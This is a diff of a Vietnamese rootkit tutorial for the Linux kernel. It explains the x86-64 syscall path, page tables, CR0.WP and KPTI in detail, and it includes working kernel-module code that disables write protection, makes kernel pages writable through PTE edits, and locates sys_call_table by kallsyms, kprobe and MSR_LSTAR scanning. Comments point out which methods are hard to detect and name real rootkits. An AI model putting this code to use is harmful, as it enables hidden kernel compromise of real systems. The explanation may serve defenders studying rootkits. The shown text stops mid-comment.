+ * Va neu bi migrate sang CPU khac, CR0 cua CPU cu van WP=0.
  */
 void rk_unprotect_memory(void)
 {
     unsigned long cr0;
 
-    preempt_disable();              /* Không cho scheduler switch */
+    preempt_disable();              /* Khong cho scheduler switch */
 
-    cr0 = read_cr0();               /* Đọc CR0 hiện tại */
+    cr0 = read_cr0();               /* Doc CR0 hien tai */
 
-    /* Clear bit 16 (WP) bằng AND với bitmask.
+    /* Clear bit 16 (WP) bang AND voi bitmask.
      * 0x10000 = 1 << 16 = WP bit
-     * ~0x10000 = tất cả bit 1 NGOẠI TRỪ bit 16
-     * cr0 & ~0x10000 = giữ nguyên mọi bit, clear WP */
+     * ~0x10000 = tat ca bit 1 NGOAI TRU bit 16
+     * cr0 & ~0x10000 = giu nguyen moi bit, clear WP */
     rk_write_cr0(cr0 & ~0x00010000UL);
 }
 
 /*
- * Bật lại write protection — restore trạng thái bình thường.
+ * Bat lai write protection — restore trang thai binh thuong.
  *
- * Gọi NGAY SAU KHI ghi xong. Giữ WP=0 lâu = risk.
+ * Goi NGAY SAU KHI ghi xong. Giu WP=0 lau = risk.
  */
 void rk_protect_memory(void)
 {
@@ -448,40 +677,40 @@ void rk_protect_memory(void)
 
     cr0 = read_cr0();
 
-    /* Set bit 16 (WP) bằng OR.
-     * cr0 | 0x10000 = giữ nguyên mọi bit, set WP = 1 */
+    /* Set bit 16 (WP) bang OR.
+     * cr0 | 0x10000 = giu nguyen moi bit, set WP = 1 */
     rk_write_cr0(cr0 | 0x00010000UL);
 
-    preempt_enable();               /* Cho phép scheduler lại */
+    preempt_enable();               /* Cho phep scheduler lai */
 }
 
 /* ══════════════════════════════════════════════════════════════
  * ALTERNATIVE: set_memory_rw / set_memory_ro
  *
- * Thay đổi page table entries thay vì CR0.
- * An toàn hơn vì:
- *   1. Chỉ affect pages cụ thể, không disable toàn bộ protection
- *   2. Kernel API chính thức (mặc dù designed cho module use)
- *   3. Không trigger CR0 monitoring
+ * Thay doi page table entries thay vi CR0.
+ * An toan hon vi:
+ *   1. Chi affect pages cu the, khong disable toan bo protection
+ *   2. Kernel API chinh thuc (mac du designed cho module use)
+ *   3. Khong trigger CR0 monitoring
  *
- * Nhược điểm:
- *   - Address phải page-aligned (4096-byte boundary)
- *   - Một số kernel restrict function này cho built-in code only
- *   - set_memory_rw() có thể bị monitor bởi LSM
+ * Nhuoc diem:
+ *   - Address phai page-aligned (4096-byte boundary)
+ *   - Mot so kernel restrict function nay cho built-in code only
+ *   - set_memory_rw() co the bi monitor boi LSM
  * ══════════════════════════════════════════════════════════════ */
 
 #include <asm/set_memory.h>
 
 static int rk_make_rw(unsigned long addr, int numpages)
 {
-    /* set_memory_rw() thay đổi PTE (Page Table Entry):
-     *   Clear _PAGE_RO bit → page trở thành writable
+    /* set_memory_rw() thay doi PTE (Page Table Entry):
+     *   Clear _PAGE_RO bit -> page tro thanh writable
      *
-     * addr PHẢI là page-aligned:
+     * addr PHAI la page-aligned:
      *   addr & ~(PAGE_SIZE - 1) = addr rounded down to page boundary
      *
-     * numpages: số pages cần thay đổi. Syscall table thường
-     *           nằm gọn trong 1-2 pages. */
+     * numpages: so pages can thay doi. Syscall table thuong
+     *           nam gon trong 1-2 pages. */
     unsigned long page_addr = addr & PAGE_MASK;  /* PAGE_MASK = ~(PAGE_SIZE-1) */
     return set_memory_rw(page_addr, numpages);
 }
@@ -493,54 +722,54 @@ static int rk_make_ro(unsigned long addr, int numpages)
 }
 
 /* ══════════════════════════════════════════════════════════════
- * PTE MANIPULATION — Phương pháp thấp nhất (level thấp nhất)
+ * PTE MANIPULATION — Phuong phap thap nhat (level thap nhat)
  *
- * Trực tiếp walk page table và sửa PTE bits.
- * Không dùng bất kỳ kernel API nào → khó detect.
- * Nhưng phức tạp nhất và dễ crash nhất.
+ * Truc tiep walk page table va sua PTE bits.
+ * Khong dung bat ky kernel API nao -> kho detect.
+ * Nhung phuc tap nhat va de crash nhat.
  * ══════════════════════════════════════════════════════════════ */
 
 #include <asm/pgtable.h>  /* pgd_t, p4d_t, pud_t, pmd_t, pte_t */
 
 /*
- * Walk 4/5-level page table để tìm PTE cho virtual address.
+ * Walk 4/5-level page table de tim PTE cho virtual address.
  *
  * x86-64 paging structure (4-level, 48-bit VA):
  *
  *   Virtual Address (48 bits used):
- *   ┌──────┬──────┬──────┬──────┬──────────┐
- *   │PGD(9)│PUD(9)│PMD(9)│PTE(9)│Offset(12)│
- *   └──┬───┴──┬───┴──┬───┴──┬───┴────┬─────┘
- *      │      │      │      │        │
- *      ▼      ▼      ▼      ▼        ▼
- *    CR3 → PGD → PUD → PMD → PTE → Physical Page + Offset
+ *   +------+------+------+------+----------+
+ *   |PGD(9)|PUD(9)|PMD(9)|PTE(9)|Offset(12)|
+ *   +--+---+--+---+--+---+--+---+----+-----+
+ *      |      |      |      |        |
+ *      v      v      v      v        v
+ *    CR3 -> PGD -> PUD -> PMD -> PTE -> Physical Page + Offset
  *    (PML4)  (PDPT)   (PD)   (PT)
  *
- *   5-level paging thêm P4D giữa PGD và PUD.
- *   Kernel abstract điều này: nếu 5-level disable,
- *   p4d_offset() trả về PGD entry (transparent).
+ *   5-level paging them P4D giua PGD va PUD.
+ *   Kernel abstract dieu nay: neu 5-level disable,
+ *   p4d_offset() tra ve PGD entry (transparent).
  *
- * Return: pte_t* pointing to the PTE, hoặc NULL nếu unmapped.
+ * Return: pte_t* pointing to the PTE, hoac NULL neu unmapped.
  */
 static pte_t *rk_walk_page_table(unsigned long addr)
 {
     pgd_t *pgd;       /* Page Global Directory (Level 4 / PML4) */
-    p4d_t *p4d;       /* Page 4 Directory (Level 5, nếu có) */
+    p4d_t *p4d;       /* Page 4 Directory (Level 5, neu co) */
     pud_t *pud;       /* Page Upper Directory (Level 3 / PDPT) */
     pmd_t *pmd;       /* Page Middle Directory (Level 2 / PD) */
     pte_t *pte;       /* Page Table Entry (Level 1 / PT) */
 
     /* Kernel addresses (above PAGE_OFFSET) MUST use init_mm.
      * init_mm.pgd = CR3 value cho kernel mapping.
-     * Với KPTI (Kernel Page Table Isolation), process page tables
-     * chỉ map minimal kernel stub — không chứa full kernel mapping.
-     * Rootkit chỉ manipulate kernel pages, nên luôn dùng init_mm. */
+     * Voi KPTI (Kernel Page Table Isolation), process page tables
+     * chi map minimal kernel stub — khong chua full kernel mapping.
+     * Rootkit chi manipulate kernel pages, nen luon dung init_mm. */
     pgd = pgd_offset(&init_mm, addr);
     if (pgd_none(*pgd) || pgd_bad(*pgd))
         return NULL;
 
-    /* P4D — chỉ meaningful khi 5-level paging.
-     * Trên 4-level, p4d_offset() = identity (return pgd). */
+    /* P4D — chi meaningful khi 5-level paging.
+     * Tren 4-level, p4d_offset() = identity (return pgd). */
     p4d = p4d_offset(pgd, addr);
     if (p4d_none(*p4d) || p4d_bad(*p4d))
         return NULL;
@@ -549,8 +778,8 @@ static pte_t *rk_walk_page_table(unsigned long addr)
     if (pud_none(*pud) || pud_bad(*pud))
         return NULL;
 
-    /* Check nếu PUD maps huge page (1GB page).
-     * Nếu là huge page, không có PMD/PTE levels. */
+    /* Check neu PUD maps huge page (1GB page).
+     * Neu la huge page, khong co PMD/PTE levels. */
     if (pud_large(*pud))
         return (pte_t *)pud;
 
@@ -558,7 +787,7 @@ static pte_t *rk_walk_page_table(unsigned long addr)
     if (pmd_none(*pmd) || pmd_bad(*pmd))
         return NULL;
 
-    /* Check nếu PMD maps huge page (2MB page). */
+    /* Check neu PMD maps huge page (2MB page). */
     if (pmd_large(*pmd))
         return (pte_t *)pmd;
 
@@ -570,15 +799,15 @@ static pte_t *rk_walk_page_table(unsigned long addr)
 }
 
 /*
- * Thay đổi write permission bằng PTE manipulation.
+ * Thay doi write permission bang PTE manipulation.
  *
- * Ưu điểm so với CR0 trick:
- *   - Chỉ affect 1 page, không disable toàn bộ WP
- *   - Không trigger CR0 monitoring
+ * Uu diem so voi CR0 trick:
+ *   - Chi affect 1 page, khong disable toan bo WP
+ *   - Khong trigger CR0 monitoring
  *
- * Ưu điểm so với set_memory_rw():
- *   - Không dùng exported kernel API → khó trace
- *   - set_memory_rw() có thể bị restricted
+ * Uu diem so voi set_memory_rw():
+ *   - Khong dung exported kernel API -> kho trace
+ *   - set_memory_rw() co the bi restricted
  */
 static int rk_set_page_rw(unsigned long addr)
 {
@@ -587,13 +816,13 @@ static int rk_set_page_rw(unsigned long addr)
         return -EINVAL;
 
     /* pte_mkwrite() set _PAGE_RW bit trong PTE entry.
-     * Phải flush TLB sau khi thay đổi PTE, nếu không
-     * CPU cache PTE cũ → thay đổi không có effect. */
+     * Phai flush TLB sau khi thay doi PTE, neu khong
+     * CPU cache PTE cu -> thay doi khong co effect. */
     *pte = pte_mkwrite(*pte);
 
-    /* Flush TLB cho address này trên tất cả CPUs.
-     * __flush_tlb_one_kernel() chỉ flush trên CPU hiện tại.
-     * Nếu cần SMP-safe: dùng flush_tlb_kernel_range(). */
+    /* Flush TLB cho address nay tren tat ca CPUs.
+     * __flush_tlb_one_kernel() chi flush tren CPU hien tai.
+     * Neu can SMP-safe: dung flush_tlb_kernel_range(). */
     __flush_tlb_one_kernel(addr);
 
     return 0;
@@ -614,39 +843,352 @@ static int rk_set_page_ro(unsigned long addr)
 
 ---
 
-## Chapter 2: Tìm sys_call_table
+## Chapter 2: Tim sys_call_table
 
-### 2.1 Tại sao sys_call_table quan trọng?
+### 2.0 Syscall Mechanism Deep Dive — Tu userspace toi kernel
+
+Truoc khi tim sys_call_table, ban can hieu syscall hoat dong nhu the nao tai muc thap nhat — tu instruction CPU thuc thi, qua hardware privilege transition, den kernel code xu ly request. Phan nay mo ta chi tiet tung buoc.
+
+#### Ring 0 vs Ring 3: Hardware Privilege Levels
+
+CPU x86-64 co 4 privilege levels (rings), nhung Linux chi dung 2:
+
+- **Ring 3 (User mode)**: Noi tat ca user applications chay. Khong the truc tiep access hardware, kernel memory, hoac thuc thi privileged instructions (nhu `mov cr0`, `wrmsr`, `hlt`). Neu co gang -> CPU raise #GP (General Protection Fault) -> process bi kill.
+
+- **Ring 0 (Kernel mode)**: Noi kernel code chay. Co quyen truy cap MOI THU: moi thanh ghi, moi vung nho, moi instruction. Rootkit code chay o Ring 0 — day la ly do no nguy hiem.
+
+De chuyen tu Ring 3 sang Ring 0, user process PHAI dung mot trong cac co che duoc CPU va OS cho phep. Tren x86-64 Linux, co 2 cach:
+1. **SYSCALL instruction** (hien dai, nhanh) — duoc dung cho 64-bit syscalls
+2. **INT 0x80** (legacy, cham) — 32-bit compatibility, van ton tai
+
+#### MSR Registers cho SYSCALL
+
+`SYSCALL` khong phai software interrupt — no la dedicated instruction voi hardware support. CPU dung 3 Model Specific Registers (MSRs) de configure behavior:
 
 ```
-sys_call_table là mảng gồm ~450 function pointers (tùy kernel version).
+MSR_LSTAR (0xC0000082) — Long Mode SYSCALL Target Address
++----------------------------------------------------------------+
+| Dia chi kernel entry point. Khi CPU thuc thi SYSCALL,          |
+| no set RIP = gia tri trong MSR_LSTAR.                          |
+| Linux set MSR_LSTAR = address cua entry_SYSCALL_64             |
+| (defined trong arch/x86/entry/entry_64.S)                      |
++----------------------------------------------------------------+
+  Rootkit implication: doc MSR_LSTAR -> biet address cua 
+  entry_SYSCALL_64 -> scan code tim reference toi sys_call_table.
+
+MSR_STAR (0xC0000081) — Segment Selectors
++----------------------------------------------------------------+
+| Bits [63:48] = SYSRET CS/SS selectors (user mode segments)     |
+| Bits [47:32] = SYSCALL CS/SS selectors (kernel mode segments)  |
+| Bits [31:0]  = (reserved/EIP for 32-bit SYSCALL, unused 64-bit)|
++----------------------------------------------------------------+
+  CPU dung cac selectors nay de chuyen segment registers
+  khi transition giua user/kernel mode.
+
+MSR_FMASK (0xC0000084) — RFLAGS Mask
++----------------------------------------------------------------+
+| Moi bit = 1 trong FMASK -> bit tuong ung trong RFLAGS bi CLEAR |
+| khi SYSCALL execute.                                           |
+| Linux set FMASK de clear: IF (interrupts), DF (direction),     |
+| TF (trap/single-step), AC (alignment check)                    |
++----------------------------------------------------------------+
+  Quan trong: IF bi clear -> interrupts disabled khi vao kernel
+  entry code. Kernel bat lai sau khi setup stack.
+```
+
+#### SYSCALL Execution Flow — Tung instruction
+
+Day la luong thuc thi chi tiet khi user process goi mot syscall (vi du `read(fd, buf, count)`):
+
+```
+User process (Ring 3):
+  ; C library (glibc) chuyen function call thanh syscall:
+  mov rax, 0              ; __NR_read = 0 (syscall number)
+  mov rdi, fd             ; arg1: file descriptor
+  mov rsi, buf            ; arg2: buffer pointer  
+  mov rdx, count          ; arg3: byte count
+  syscall                 ; <== CPU HARDWARE TRANSITION
+                          ;
+                          ; CPU thuc hien cac buoc SAU (all hardware, no software):
+                          ;   1. RCX = RIP hien tai (save user return address)
+                          ;   2. R11 = RFLAGS hien tai (save user flags)
+                          ;   3. RFLAGS &= ~MSR_FMASK (clear IF, DF, TF, AC)
+                          ;   4. CS = STAR[47:32] (kernel code segment)
+                          ;   5. SS = STAR[47:32] + 8 (kernel stack segment)
+                          ;   6. RIP = MSR_LSTAR (jump to kernel entry)
+                          ;   7. CPL = 0 (now Ring 0!)
+                          ;
+                          ; LUU Y: RSP CHUA THAY DOI! Van la user stack.
+                          ; Kernel entry code phai switch stack manually.
+
+Kernel (entry_SYSCALL_64 trong arch/x86/entry/entry_64.S):
+  swapgs                  ; Swap GS base register:
+                          ;   User GS base <-> Kernel GS base
+                          ;   Kernel GS base tro toi per-CPU data area
+                          ;   (struct pcpu_hot, chua kernel stack pointer)
+                          ;
+  mov [gs:pcpu_hot + X], rsp  ; Save user RSP vao per-CPU storage
+                          ;
+  mov rsp, [gs:pcpu_hot + Y]  ; Load kernel stack pointer
+                          ;     (moi thread co kernel stack rieng,
+                          ;      allocated khi thread duoc tao,
+                          ;      size = THREAD_SIZE = 16KB hoac 32KB)
+                          ;
+  ; --- Bay gio dang tren kernel stack ---
+  ;
+  push regs...            ; Build struct pt_regs tren stack:
+                          ;   push $__USER_DS       ; ss
+                          ;   push saved_user_rsp   ; sp  
+                          ;   push r11              ; flags (saved in r11)
+                          ;   push $__USER_CS       ; cs
+                          ;   push rcx              ; ip (saved in rcx)
+                          ;   push rax              ; orig_ax (syscall number)
+                          ;   push rdi,rsi,rdx,...  ; general registers
+                          ;
+  ; pt_regs struct hoan chinh tren stack
+  ;
+  mov rdi, rsp            ; arg1 cho do_syscall_64 = pointer to pt_regs
+  call do_syscall_64      ; --> C function trong arch/x86/entry/common.c
+
+do_syscall_64(struct pt_regs *regs):
+  ; regs->orig_ax = syscall number (0 = __NR_read)
+  nr = regs->orig_ax
+  
+  if (nr < NR_syscalls)   ; Bounds check! (NR_syscalls ~ 450)
+    regs->ax = sys_call_table[nr](regs)
+                          ; ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+                          ; DAY LA NOI SYS_CALL_TABLE DUOC DUNG!
+                          ; sys_call_table[0] = __x64_sys_read
+                          ; Goi function voi pt_regs* lam argument
+                          ;
+                          ; Return value duoc ghi vao regs->ax
+                          ; (se tro thanh RAX khi return ve userspace)
+  
+  ; ... syscall return path ...
+  ; Restore registers tu pt_regs
+  ; swapgs (chuyen ve user GS)  
+  ; sysretq (hardware return to Ring 3:
+  ;          RIP = RCX, RFLAGS = R11, CPL = 3)
+```
+
+#### sys_call_table — Chi tiet implementation
+
+`sys_call_table` duoc declare trong `arch/x86/entry/syscall_64.c`:
+
+```
+Khai bao:
+  const sys_call_ptr_t sys_call_table[__NR_syscall_max + 1] = {
+      [0 ... __NR_syscall_max] = (sys_call_ptr_t)&__x64_sys_ni_syscall,
+      #include <asm/syscalls_64.h>
+  };
+
+  - const: nam trong .rodata section -> read-only page
+  - sys_call_ptr_t = typedef cho function pointer
+  - Khoi tao tat ca entries = ni_syscall (not implemented)
+  - #include syscalls_64.h override entries co implementation
+  
+File asm/syscalls_64.h duoc auto-generated tu syscall table definition:
+  __SYSCALL(0, __x64_sys_read)
+  __SYSCALL(1, __x64_sys_write)
+  __SYSCALL(2, __x64_sys_open)
+  ...
+  
+  Macro __SYSCALL(nr, sym) expand thanh:
+    [nr] = (sys_call_ptr_t)sym,
+
+Memory layout cua sys_call_table:
++----------+------------------------------------------+
+| Index    | Value (function pointer, 8 bytes each)    |
++----------+------------------------------------------+
+| [0]      | 0xffffffff812345a0 = __x64_sys_read      |
+| [1]      | 0xffffffff812345f0 = __x64_sys_write     |
+| [2]      | 0xffffffff81234640 = __x64_sys_open      |
+| [3]      | 0xffffffff81234690 = __x64_sys_close     |
+| ...      | ...                                      |
+| [62]     | 0xffffffff81237a00 = __x64_sys_kill      |
+| ...      | ...                                      |
+| [217]    | 0xffffffff8123b100 = __x64_sys_getdents64|
+| ...      | ...                                      |
+| [~449]   | 0xffffffff81230000 = __x64_sys_ni_syscall|
++----------+------------------------------------------+
+  Total size: ~450 entries * 8 bytes = ~3600 bytes (< 1 page)
+  Nam trong .rodata -> read-only -> can disable WP de ghi
+```
+
+#### KASLR — Kernel Address Space Layout Randomization
+
+KASLR randomize vi tri kernel image trong physical va virtual memory moi lan boot:
+
+- Kernel physical address: chon tu mot trong nhieu slots, aligned 2MB (hoac 16MB tren cac config moi). Range phu thuoc vao physical memory layout.
+- Kernel virtual address: `__START_KERNEL_map` + random offset. Offset la boi so cua 2MB, trong khoang ~1GB range.
+- KASLR entropy: khoang 9-15 bits tuy config, tuong duong 512-32768 vi tri kha dung.
+- Module KASLR: modules duoc load tai random offset trong vmalloc range, doc lap voi kernel KASLR base.
+
+Hau qua: **KHONG the hardcode bat ky kernel address nao.** Moi address phai duoc resolve tai runtime (bang kallsyms, kprobe, hoac memory scanning).
+
+Luu y: KASLR khong phai la defense manh. Voi kernel info leak (qua dmesg, /proc/kallsyms khi kptr_restrict=0, hoac side-channel attacks), attacker de dang tim duoc kernel base address. Nhung no van tang bar cho casual exploitation.
+
+#### Page Table Hierarchy tren x86-64
+
+Moi virtual address duoc translate thanh physical address qua page table walk. Tren x86-64 voi 4-level paging (48-bit virtual address):
+
+```
+Virtual address bits [47:0] duoc chia thanh 5 fields:
+ 
+  Bit:  47      39 38      30 29      21 20      12 11       0
+       +----------+----------+----------+----------+----------+
+       | PGD idx  | PUD idx  | PMD idx  | PTE idx  | Offset   |
+       | (9 bits) | (9 bits) | (9 bits) | (9 bits) | (12 bits)|
+       +----------+----------+----------+----------+----------+
+       512 entries 512 entries 512 entries 512 entries 4096 bytes
+       per table   per table   per table   per table   per page
+
+Page Table Walk:
+                                                    
+  CR3 register (physical address cua PGD)           
+    |                                               
+    v                                               
+  PGD (Page Global Directory) = PML4 Table          
+  +-------+-------+-------+- -+-------+            
+  | E[0]  | E[1]  | E[2]  |   |E[511] | 512 entries, 8 bytes each
+  +---+---+-------+-------+- -+-------+            
+      |  index = VA[47:39]                          
+      v                                             
+  PUD (Page Upper Directory) = PDPT                 
+  +-------+-------+-------+- -+-------+            
+  | E[0]  | E[1]  | E[2]  |   |E[511] | 512 entries
+  +---+---+-------+-------+- -+-------+            
+      |  index = VA[38:30]                          
+      |                                             
+      +---> Neu PUD entry co PS bit = 1:            
+      |     1GB Huge Page! Physical addr = PUD entry + VA[29:0]
+      |     (khong can PMD/PTE walk)                
+      |                                             
+      v  (PS=0: tiep tuc walk)                      
+  PMD (Page Middle Directory) = Page Directory      
+  +-------+-------+-------+- -+-------+            
+  | E[0]  | E[1]  | E[2]  |   |E[511] | 512 entries
+  +---+---+-------+-------+- -+-------+            
+      |  index = VA[29:21]                          
+      |                                             
+      +---> Neu PMD entry co PS bit = 1:            
+      |     2MB Huge Page! Physical addr = PMD entry + VA[20:0]
+      |                                             
+      v  (PS=0: tiep tuc walk)                      
+  PTE (Page Table Entry) = Page Table               
+  +-------+-------+-------+- -+-------+            
+  | E[0]  | E[1]  | E[2]  |   |E[511] | 512 entries
+  +---+---+-------+-------+- -+-------+            
+      |  index = VA[20:12]                          
+      v                                             
+  Physical Page (4KB)                               
+  +-------- 4096 bytes --------+                    
+  | Data tai offset VA[11:0]   |                    
+  +----------------------------+                    
+
+Moi Page Table Entry (8 bytes) co format:
+  Bit  Name    Meaning
+  ---  ----    -------
+   0   P       Present (1 = page co trong memory)
+   1   R/W     Read/Write (0 = read-only, 1 = writable)
+   2   U/S     User/Supervisor (0 = kernel only, 1 = user accessible)
+   3   PWT     Page-level Write-Through
+   4   PCD     Page-level Cache Disable
+   5   A       Accessed (CPU set khi page duoc read)
+   6   D       Dirty (CPU set khi page duoc write)
+   7   PS/PAT  Page Size (cho PUD/PMD) hoac PAT (cho PTE)
+  12-51        Physical address (bit [51:12] cua physical frame)
+  63   NX      No-Execute (1 = khong duoc execute code trong page nay)
+```
+
+Khi 5-level paging duoc bat (CONFIG_X86_5LEVEL, kernel >= 4.14, hardware support can):
+- Them P4D (Page 4 Directory) giua PGD va PUD
+- Virtual address mo rong len 57 bits
+- Kernel abstract dieu nay: `p4d_offset()` tren 4-level paging chi return PGD entry (no-op)
+
+#### CR0.WP Bit — Write Protection trong Ring 0
+
+CR0 la Control Register 0, mot trong nhung thanh ghi quan trong nhat cua x86 CPU:
+
+```
+CR0 Register Layout (64 bits, chi cac bit quan trong):
+  Bit   Name    Meaning
+  ---   ----    -------
+   0    PE      Protection Enable (1 = protected mode)
+   1    MP      Monitor Coprocessor
+   2    EM      Emulation
+   3    TS      Task Switched
+   4    ET      Extension Type
+   5    NE      Numeric Error
+  16    WP      Write Protect           <-- BIT QUAN TRONG NHAT CHO ROOTKIT
+  18    AM      Alignment Mask
+  29    NW      Not Write-through
+  30    CD      Cache Disable
+  31    PG      Paging Enable (1 = virtual memory active)
+
+CR0.WP (bit 16):
+  WP = 1 (default):
+    - Ring 0 code KHONG duoc ghi vao page co R/W = 0 trong PTE
+    - Bao ve kernel code va data khoi accidental writes
+    - sys_call_table nam trong .rodata -> R/W = 0 -> KHONG the ghi
+
+  WP = 0 (rootkit set):
+    - Ring 0 code CO THE ghi vao BAT KY page nao, ke ca R/W = 0
+    - Ring 3 van bi chan (U/S bit van enforced)
+    - Cho phep rootkit ghi vao sys_call_table
+
+  Luu y: WP la PER-CPU register. Clear WP tren CPU 0 khong 
+  anh huong CPU 1. Rootkit chi can clear tren CPU dang chay,
+  vi pointer write (8 bytes, aligned) la atomic tren x86-64.
+```
+
+#### KPTI — Kernel Page Table Isolation
+
+KPTI (truoc do goi la KAISER) duoc them vao kernel 4.15 de mitigation Meltdown vulnerability:
+
+- **Truoc KPTI**: User va kernel dung CHUNG mot page table. User pages mapped voi U/S=1, kernel pages voi U/S=0. Tat ca kernel memory luon "co mat" trong address space cua moi process (chi bi chan boi U/S bit). Meltdown cho phep user process doc kernel memory qua speculative execution.
+
+- **Sau KPTI**: Moi process co 2 page tables:
+  1. **User page table**: map user pages + chi mot "trampoline" nho cua kernel (entry/exit code). KHONG map kernel text, data, stacks.
+  2. **Kernel page table**: map MOI THU (user + full kernel). Chi duoc dung khi o Ring 0.
+
+Khi SYSCALL: CPU van dung user page table -> jump toi trampoline (phan kernel duy nhat duoc map) -> trampoline switch CR3 sang kernel page table -> proceed normally.
+
+**Rootkit implication**: Khi rootkit walk page table de tim/modify kernel pages, PHAI dung `init_mm.pgd` (kernel page table root), KHONG dung `current->mm->pgd` (user page table — khong chua full kernel mapping). Day la ly do code dung `pgd_offset(&init_mm, addr)`.
+
+---
+
+### 2.1 Tai sao sys_call_table quan trong?
+
+```
+sys_call_table la mang gom ~450 function pointers (tuy kernel version).
 
 Index = syscall number (__NR_read = 0, __NR_write = 1, ...)
-Value = address của handler function
+Value = address cua handler function
 
-Khi user process gọi syscall:
-  1. CPU thực hiện SYSCALL instruction
-  2. Kernel entry code đọc RAX (syscall number)
+Khi user process goi syscall:
+  1. CPU thuc hien SYSCALL instruction
+  2. Kernel entry code doc RAX (syscall number)
   3. Lookup: handler = sys_call_table[rax]
   4. Call handler(regs)
 
-Hook = thay sys_call_table[N] bằng address function của ta.
-Sau đó, MỌI process gọi syscall N sẽ chạy code của ta thay vì code thật.
+Hook = thay sys_call_table[N] bang address function cua ta.
+Sau do, MOI process goi syscall N se chay code cua ta thay vi code that.
 
-Đây là kỹ thuật rootkit cổ điển nhất, tồn tại từ Linux 2.x.
+Day la ky thuat rootkit co dien nhat, ton tai tu Linux 2.x.
 ```
 
-### 2.2 — 6 phương pháp tìm sys_call_table
+### 2.2 — 6 phuong phap tim sys_call_table
 
 ```c
-/* syscall_table_finder.c — Tất cả phương pháp tìm sys_call_table
+/* syscall_table_finder.c — Tat ca phuong phap tim sys_call_table
  *
- * Compile riêng để test: chỉ cần file này + rootkit.h
- * insmod → dmesg xem kết quả → rmmod
+ * Compile rieng de test: chi can file nay + rootkit.h
+ * insmod -> dmesg xem ket qua -> rmmod
  *
- * Mục đích: tìm virtual address của sys_call_table[].
- * Address này thay đổi mỗi lần boot (KASLR).
- * Phải tìm lại mỗi lần module load.
+ * Muc dich: tim virtual address cua sys_call_table[].
+ * Address nay thay doi moi lan boot (KASLR).
+ * Phai tim lai moi lan module load.
  */
 
 #include "rootkit.h"
@@ -656,12 +1198,12 @@ static unsigned long *sys_call_table_addr = NULL;
 /* ──────────────────────────────────────────────────────────────
  * METHOD 1: kallsyms_lookup_name() — Kernel < 5.7
  *
- * Đơn giản nhất. Kernel export function này cho modules.
- * Hoạt động giống nm/objdump nhưng runtime.
+ * Don gian nhat. Kernel export function nay cho modules.
+ * Hoat dong giong nm/objdump nhung runtime.
  *
- * Bị unexport từ 5.7 vì:
- * - Kernel team cho rằng modules không nên tìm arbitrary symbols
- * - Giảm attack surface cho LKM rootkits
+ * Bi unexport tu 5.7 vi:
+ * - Kernel team cho rang modules khong nen tim arbitrary symbols
+ * - Giam attack surface cho LKM rootkits
  * ────────────────────────────────────────────────────────────── */
 #if LINUX_VERSION_CODE < KERNEL_VERSION(5, 7, 0)
 static unsigned long *method_1_kallsyms(void)
@@ -681,12 +1223,12 @@ static unsigned long *method_1_kallsyms(void)
 #endif
 
 /* ──────────────────────────────────────────────────────────────
- * METHOD 2: Kprobe trick — Kernel >= 5.7 (phổ biến nhất)
+ * METHOD 2: Kprobe trick — Kernel >= 5.7 (pho bien nhat)
  *
- * Đã giải thích trong util.c. Dùng rk_lookup_name() wrapper.
+ * Da giai thich trong util.c. Dung rk_lookup_name() wrapper.
  *
- * Đây là phương pháp được hầu hết rootkit hiện đại sử dụng:
- * Diamorphine, Reptile, Kovid đều dùng trick này.
+ * Day la phuong phap duoc hau het rootkit hien dai su dung:
+ * Diamorphine, Reptile, Kovid deu dung trick nay.
  * ────────────────────────────────────────────────────────────── */
 static unsigned long *method_2_kprobe(void)
 {
@@ -704,30 +1246,30 @@ static unsigned long *method_2_kprobe(void)
 }
 
 /* ──────────────────────────────────────────────────────────────
- * METHOD 3: MSR_LSTAR scan — Không dùng bất kỳ lookup API
+ * METHOD 3: MSR_LSTAR scan — Khong dung bat ky lookup API
  *
- * Nguyên lý:
- *   MSR_LSTAR (Model Specific Register 0xC0000082) chứa address
- *   của entry_SYSCALL_64 — entry point khi CPU thực hiện SYSCALL.
+ * Nguyen ly:
+ *   MSR_LSTAR (Model Specific Register 0xC0000082) chua address
+ *   cua entry_SYSCALL_64 — entry point khi CPU thuc hien SYSCALL.
  *
- *   entry_SYSCALL_64 (assembly code) sẽ:
+ *   entry_SYSCALL_64 (assembly code) se:
  *   1. Save registers
- *   2. Lookup sys_call_table[rax]    ← CÓ REFERENCE TỚI TABLE
+ *   2. Lookup sys_call_table[rax]    <-- CO REFERENCE TOI TABLE
  *   3. Call handler
  *
- *   Ta đọc MSR_LSTAR → lấy address entry_SYSCALL_64
- *   → scan code bytes tìm pattern reference tới sys_call_table.
+ *   Ta doc MSR_LSTAR -> lay address entry_SYSCALL_64
+ *   -> scan code bytes tim pattern reference toi sys_call_table.
  *
- * Ưu điểm:
- *   - Không dùng kallsyms hay kprobes
- *   - Hoạt động trên mọi kernel version
- *   - Khó detect vì chỉ đọc MSR và scan memory
+ * Uu diem:
+ *   - Khong dung kallsyms hay kprobes
+ *   - Hoat dong tren moi kernel version
+ *   - Kho detect vi chi doc MSR va scan memory
  *
- * Nhược điểm:
- *   - Pattern-dependent → có thể break khi kernel code thay đổi
- *   - Phải hiểu x86 instruction encoding
+ * Nhuoc diem:
+ *   - Pattern-dependent -> co the break khi kernel code thay doi
+ *   - Phai hieu x86 instruction encoding
  *
- * Sử dụng bởi: SucKIT rootkit (historic), một số APT tools
+ * Su dung boi: SucKIT rootkit (historic), mot so APT tools
  * ────────────────────────────────────────────────────────────── */
 static unsigned long *method_3_msr_scan(void)
 {
@@ -736,36 +1278,36 @@ static unsigned long *method_3_msr_scan(void)
     unsigned long *table = NULL;
     int i;
 
-    /* Đọc MSR_LSTAR = IA32_LSTAR (0xC0000082)
+    /* Doc MSR_LSTAR = IA32_LSTAR (0xC0000082)
      *
-     * rdmsrl() = Read MSR Long — đọc 64-bit MSR value.
-     * MSR là per-CPU register, nhưng LSTAR thường giống nhau
-     * trên tất cả cores (kernel set cùng giá trị).
+     * rdmsrl() = Read MSR Long — doc 64-bit MSR value.
+     * MSR la per-CPU register, nhung LSTAR thuong giong nhau
+     * tren tat ca cores (kernel set cung gia tri).
      *
-     * msr_value = virtual address của entry_SYSCALL_64 */
+     * msr_value = virtual address cua entry_SYSCALL_64 */
     rdmsrl(MSR_LSTAR, msr_value);
     pr_info("method_3: MSR_LSTAR = 0x%lx\n", msr_value);
 
     code_ptr = (unsigned char *)msr_value;
 
-    /* Scan entry_SYSCALL_64 code tìm reference tới sys_call_table.
+    /* Scan entry_SYSCALL_64 code tim reference toi sys_call_table.
      *
-     * Kernel code (entry_64.S) chứa instruction dạng:
